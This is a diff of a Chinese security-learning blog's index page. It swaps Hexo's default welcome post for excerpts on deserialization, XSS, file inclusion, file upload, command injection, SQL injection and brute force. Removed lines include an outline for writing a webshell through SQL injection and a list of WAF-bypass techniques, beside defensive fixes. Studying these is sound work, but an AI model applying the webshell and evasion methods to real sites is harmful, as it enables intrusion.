-<p>4.updatexml函数用extractvalue函数代替</p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h3 id="过滤危险字符"><a href="#过滤危险字符" class="headerlink" title="过滤危险字符"></a>过滤危险字符</h3><p>多数CMS都采用过滤危险字符的方式，例如，用正则表达式匹配union、sleep、load_file等关键字。如果匹配到，则退出程序</p>
-<h3 id="使用预编译语句"><a href="#使用预编译语句" class="headerlink" title="使用预编译语句"></a>使用预编译语句</h3><p>使用PDO预编译语句时需要注意的是，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库中数据的增加、删除、修改、查询</p>
-<h2 id="如何使用SQL注入写入shell"><a href="#如何使用SQL注入写入shell" class="headerlink" title="如何使用SQL注入写入shell"></a>如何使用SQL注入写入shell</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>利用union 跟select into outfile，将一句话写入shell.php文件中</p>
-<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1.知道网站绝对路径，可以通过报错，phpinfo界面，404界面等一些方式知道</p>
-<p>2.gpc没有开启，开启了单引号被转义了，语句就不能正常执行了</p>
-<p>3.拥有有file权限，默认情况下只有root有</p>
-<p>4.对目录拥有写入权限，一般image之类的存放突破的目录就有</p>
-<h2 id="SQL注入绕过waf的方法"><a href="#SQL注入绕过waf的方法" class="headerlink" title="SQL注入绕过waf的方法"></a>SQL注入绕过waf的方法</h2><h3 id="从架构层面"><a href="#从架构层面" class="headerlink" title="从架构层面"></a>从架构层面</h3><p>找到服务器真实IP，同网段绕过，http和https同时开放服务绕过，边缘资产漏洞利用绕过</p>
-<h3 id="从协议层面"><a href="#从协议层面" class="headerlink" title="从协议层面"></a>从协议层面</h3><p>分块延时传输，利用pipline绕过，利用协议未覆盖绕过，POST及GET提交绕过</p>
-<h3 id="从规则层面"><a href="#从规则层面" class="headerlink" title="从规则层面"></a>从规则层面</h3><p>编码绕过，等价符号替换绕过，普通注释和内敛注释，缓冲区溢出，mysql黑魔法，白名单及静态资源绕过，文件格式绕过，参数污染等</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><blockquote>
-<p>使用预编译，PDO，正则表达式过滤，开启魔术引号，加装WAF等</p>
-</blockquote>
-<p>代码层最佳防御 sql 漏洞方案：采用 sql 语句预编译和绑定变量，是防御sql 注入的最佳方法</p>
-<p>1.所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止 SQL 注入攻击</p>
-<p>2.对进入数据库的特殊字符（ ’ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换</p>
-<p>3.确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int型</p>
-<p>4.数据长度应该严格规定，能在一定程度上防止比较长的 SQL 注入语句无法正确执行</p>
-<p>5.网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过</p>
-<p>6.严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害</p>
-<p>7.避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断</p>
-
-      
-    </div>
-
-    
-    
-    
-
-<div>
-  
-</div>
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/22/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/95856889?s=400&u=aa80da11fcc14ae3054ecbbbe19ee819f8024678&v=4">
-      <meta itemprop="name" content="Xorb_7">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xorb_7's Blog">
-      <meta itemprop="description" content="<font color="#FFFFFF">答案都在路上，自由都在风里...</font>">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Xorb_7's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/11/22/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+          <a href="/2024/11/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">反序列化漏洞</a>
         </h2>
 
         <div class="post-meta-container">
@@ -769,14 +183,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2024-11-22 19:19:04" itemprop="dateCreated datePublished" datetime="2024-11-22T19:19:04+08:00">2024-11-22</time>
+      <time title="创建时间：2024-11-18 00:11:46" itemprop="dateCreated datePublished" datetime="2024-11-18T00:11:46+08:00">2024-11-18</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-07-10 21:52:17" itemprop="dateModified" datetime="2024-07-10T21:52:17+08:00">2024-07-10</time>
+      <time title="修改时间：2024-11-24 00:14:08" itemprop="dateModified" datetime="2024-11-24T00:14:08+08:00">2024-11-24</time>
     </span>
 
   
@@ -789,20 +203,558 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+          <h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p><img src="/img/7.jpg" alt="7"></p>
+<blockquote>
+<p><strong>原理：反序列化漏洞是基于序列化和反序列化的操作，在反序列化——unserialize()时存在用户可控参数，而反序列化会自动调用一些魔术方法，如果魔术方法内存在一些敏感操作例如eval()函数，而且参数是通过反序列化产生的，那么用户就可以通过改变参数来执行敏感操作，这就是反序列化漏洞。没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码恶意执行等一系列不可控的结果</strong></p>
+</blockquote>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/11/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+    
+    
+    
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<div>
+  
+</div>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/15/XSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/95856889?s=400&u=aa80da11fcc14ae3054ecbbbe19ee819f8024678&v=4">
+      <meta itemprop="name" content="Xorb_7">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xorb_7's Blog">
+      <meta itemprop="description" content="<font color="#FFFFFF">答案都在路上，自由都在风里...</font>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Xorb_7's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/11/15/XSS/" class="post-title-link" itemprop="url">XSS漏洞</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-11-15 00:08:11" itemprop="dateCreated datePublished" datetime="2024-11-15T00:08:11+08:00">2024-11-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-11-24 00:15:04" itemprop="dateModified" datetime="2024-11-24T00:15:04+08:00">2024-11-24</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p><img src="/img/6.jpg" alt="6"></p>
+<blockquote>
+<p><strong>原理：跨站脚本攻击，是一种Web应用中常见的安全漏洞，它允许用户将恶意代码植入Web页面，当其他用户访问此页面时，植入的恶意代码就会在其他用户的客户端中执行</strong></p>
+</blockquote>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/11/15/XSS/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+<div>
+  
+</div>
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/11/File-Inclusion/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/95856889?s=400&u=aa80da11fcc14ae3054ecbbbe19ee819f8024678&v=4">
+      <meta itemprop="name" content="Xorb_7">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xorb_7's Blog">
+      <meta itemprop="description" content="<font color="#FFFFFF">答案都在路上，自由都在风里...</font>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Xorb_7's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/11/11/File-Inclusion/" class="post-title-link" itemprop="url">File_Inclusion</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-11-11 17:44:34" itemprop="dateCreated datePublished" datetime="2024-11-11T17:44:34+08:00">2024-11-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-11-24 00:05:17" itemprop="dateModified" datetime="2024-11-24T00:05:17+08:00">2024-11-24</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p><img src="/img/5.jpg" alt="5"></p>
+<blockquote>
+<p><strong>原理：开发者将可重复使用的函数写入文件中，在使用某些函数时，直接调用文件。将被包含的文件设置为变量，这种灵活的动态调用方式让用户能够对变量可控且服务端未作任何校验</strong></p>
+</blockquote>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/11/11/File-Inclusion/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+<div>
+  
+</div>
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/08/File-Upload/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/95856889?s=400&u=aa80da11fcc14ae3054ecbbbe19ee819f8024678&v=4">
+      <meta itemprop="name" content="Xorb_7">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xorb_7's Blog">
+      <meta itemprop="description" content="<font color="#FFFFFF">答案都在路上，自由都在风里...</font>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Xorb_7's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/11/08/File-Upload/" class="post-title-link" itemprop="url">File_Upload</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-11-08 17:40:11" itemprop="dateCreated datePublished" datetime="2024-11-08T17:40:11+08:00">2024-11-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-11-24 00:03:32" itemprop="dateModified" datetime="2024-11-24T00:03:32+08:00">2024-11-24</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p><img src="/img/4.jpg" alt="4"></p>
+<blockquote>
+<p><strong>原理：如果对文件上传的路径变量过滤不严，并且对上传文件的后缀或者文件类型限制不严，用户可以通过web访问的目录任意上传文件，包括网站后门文件（webshell），进而远程控制网站服务器</strong></p>
+</blockquote>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/11/08/File-Upload/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+<div>
+  
+</div>
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/05/Command-Injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/95856889?s=400&u=aa80da11fcc14ae3054ecbbbe19ee819f8024678&v=4">
+      <meta itemprop="name" content="Xorb_7">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xorb_7's Blog">
+      <meta itemprop="description" content="<font color="#FFFFFF">答案都在路上，自由都在风里...</font>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Xorb_7's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/11/05/Command-Injection/" class="post-title-link" itemprop="url">Command_Injection&Code_execution</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-11-05 14:46:18" itemprop="dateCreated datePublished" datetime="2024-11-05T14:46:18+08:00">2024-11-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-11-24 00:01:38" itemprop="dateModified" datetime="2024-11-24T00:01:38+08:00">2024-11-24</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><p><img src="/img/3.jpg" alt="3"></p>
+<blockquote>
+<p><strong>原理：在对可以输入数据的地方，输入恶意命令，网站未对其进行过滤，从而可以执行命令</strong></p>
+</blockquote>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/11/05/Command-Injection/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+<div>
+  
+</div>
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/01/SQL-Injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/95856889?s=400&u=aa80da11fcc14ae3054ecbbbe19ee819f8024678&v=4">
+      <meta itemprop="name" content="Xorb_7">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xorb_7's Blog">
+      <meta itemprop="description" content="<font color="#FFFFFF">答案都在路上，自由都在风里...</font>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Xorb_7's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/11/01/SQL-Injection/" class="post-title-link" itemprop="url">SQL_Injection</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-11-01 12:29:43" itemprop="dateCreated datePublished" datetime="2024-11-01T12:29:43+08:00">2024-11-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-11-23 23:59:56" itemprop="dateModified" datetime="2024-11-23T23:59:56+08:00">2024-11-23</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><p><img src="/img/2.jpg" alt="2"></p>
+<blockquote>
+<p><strong>原理：攻击者通过浏览器或其他客户端将恶意SQL语句插入网站，网站未对其进行过滤，并将恶意SQL语句代入数据库且执行，获取敏感信息或执行其他操作</strong></p>
+</blockquote>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/11/01/SQL-Injection/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+<div>
+  
+</div>
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/31/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/95856889?s=400&u=aa80da11fcc14ae3054ecbbbe19ee819f8024678&v=4">
+      <meta itemprop="name" content="Xorb_7">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xorb_7's Blog">
+      <meta itemprop="description" content="<font color="#FFFFFF">答案都在路上，自由都在风里...</font>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Xorb_7's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/10/31/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" class="post-title-link" itemprop="url">暴力破解</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-10-31 16:28:59" itemprop="dateCreated datePublished" datetime="2024-10-31T16:28:59+08:00">2024-10-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-11-23 23:57:31" itemprop="dateModified" datetime="2024-11-23T23:57:31+08:00">2024-11-23</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><p><img src="/img/1.jpg" alt="1"></p>
+<blockquote>
+<p><strong>原理：暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。 理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的</strong></p>
+</blockquote>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/10/31/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
